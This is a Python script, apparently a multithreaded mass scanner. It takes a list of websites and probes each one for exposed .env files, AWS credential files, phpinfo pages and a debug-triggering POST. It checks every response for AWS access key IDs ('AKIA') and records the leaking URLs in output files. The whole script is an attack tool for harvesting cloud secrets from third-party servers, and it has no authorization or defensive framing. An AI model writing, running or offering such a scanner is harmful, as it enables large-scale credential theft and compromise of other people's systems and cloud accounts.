import requests
import sys
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
listSite = sys.argv[1]
op = [i.strip() for i in open(listSite, "r").readlines()]
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN

def check(site):
  try:
    env = requests.get("https://"+site + "/.env", verify=False, allow_redirects=False, timeout=8)
    env1 = requests.get("https://"+site + "/core/.env", verify=False, allow_redirects=False, timeout=8)
    env2 = requests.get("https://"+site + "/web/.env", verify=False, allow_redirects=False, timeout=8)
    env3 = requests.get("https://"+site + "/app/.env", verify=False, allow_redirects=False, timeout=8)
    env4 = requests.get("https://"+site + "/laravel/.env", verify=False, allow_redirects=False, timeout=8)
    env5 = requests.get("https://"+site + "/crm/.env", verify=False, allow_redirects=False, timeout=8)
    env6 = requests.get("https://"+site + "/backend/.env", verify=False, allow_redirects=False, timeout=8)
    env7 = requests.get("https://"+site + "/local/.env", verify=False, allow_redirects=False, timeout=8)
    env8 = requests.get("https://"+site + "/application/.env", verify=False, allow_redirects=False, timeout=8)
    env9 = requests.get("https://"+site + "/admin/.env", verify=False, allow_redirects=False, timeout=8)
    env10 = requests.get("https://"+site + "/prod/.env", verify=False, allow_redirects=False, timeout=8)
    env11 = requests.get("https://"+site + "/api/.env", verify=False, allow_redirects=False, timeout=8)
    akia1 = requests.get("https://"+site + "/.aws/credentials", verify=False, allow_redirects=False, timeout=8)
    akia2 = requests.get("https://"+site + "/phpinfo", verify=False, allow_redirects=False, timeout=8)
    akia3 = requests.get("https://"+site + "/_profiler/phpinfo", verify=False, allow_redirects=False, timeout=8)
    akia4 = requests.get("https://"+site + "/phpinfo.php", verify=False, allow_redirects=False, timeout=8)
    akia5 = requests.get("https://"+site + "/info.php", verify=False, allow_redirects=False, timeout=8)
    debug = requests.post("https://"+site, data={"user[]":"admin@localhost"}, verify=False, allow_redirects=False, timeout=8)

    if 'AKIA' in env.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/.env\n")
    elif 'AKIA' in env1.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 1").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/core/.env\n")
    elif 'AKIA' in env2.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 2").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/web/.env\n")
    elif 'AKIA' in env3.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 3").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/app/.env\n")
    elif 'AKIA' in env4.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 4").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/laravel/.env\n")
    elif 'AKIA' in env5.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 5").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/crm/.env\n")
    elif 'AKIA' in env6.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 6").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/backend/.env\n")
    elif 'AKIA' in env7.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 7").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/local/.env\n")
    elif 'AKIA' in env8.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 8").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/application/.env\n")
    elif 'AKIA' in env9.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 9").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/admin/.env\n")
    elif 'AKIA' in env10.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 10").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/prod/.env\n")
    elif 'AKIA' in env11.text:
      print("{}# {}" + "https://"+site + "{} | {}ENV 11").format(fg, fw, fw, fg)
      open('env.txt', 'a').write("https://"+site + "/api/.env\n")
    elif 'AKIA' in akia1.text:
      print("{}# {}" + "https://"+site + "{} | {}AKIA 1").format(fg, fw, fw, fg)
      open('aws.txt', 'a').write("https://"+site + "/.aws/credentials\n")
    elif 'AKIA' in akia2.text:
      print("{}# {}" + "https://"+site + "{} | {}AKIA 2").format(fg, fw, fw, fg)
      open('aws.txt', 'a').write("https://"+site + "/phpinfo\n")
    elif 'AKIA' in akia3.text:
      print("{}# {}" + "https://"+site + "{} | {}AKIA 3").format(fg, fw, fw, fg)
      open('aws.txt', 'a').write("https://"+site + "/_profiler/phpinfo\n")
    elif 'AKIA' in akia4.text:
      print("{}# {}" + "https://"+site + "{} | {}AKIA 4").format(fg, fw, fw, fg)
      open('aws.txt', 'a').write("https://"+site + "/phpinfo.php\n")
    elif 'AKIA' in akia5.text:
      print("{}# {}" + "https://"+site + "{} | {}AKIA 5").format(fg, fw, fw, fg)
      open('aws.txt', 'a').write("https://"+site + "/info.php\n")
    elif 'AKIA' in debug.text:
      print("{}# {}" + "https://"+site + "{} | {}DEBUG").format(fg, fw, fw, fg)
      open('debug.txt', 'a').write("https://"+site + "\n")
    else:
      print("{}# {}" + "https://"+site + "{} | {}NOT FOUND").format(fr, fw, fw, fc)
  except Exception as e:
      print("{}# {}" + "https://"+site + "{} | {}TIMEOUT").format(fr, fw, fw, fr)
    
kekw = Pool(30) #thread
kekw.map(check, op)
kekw.close()
kekw.join()
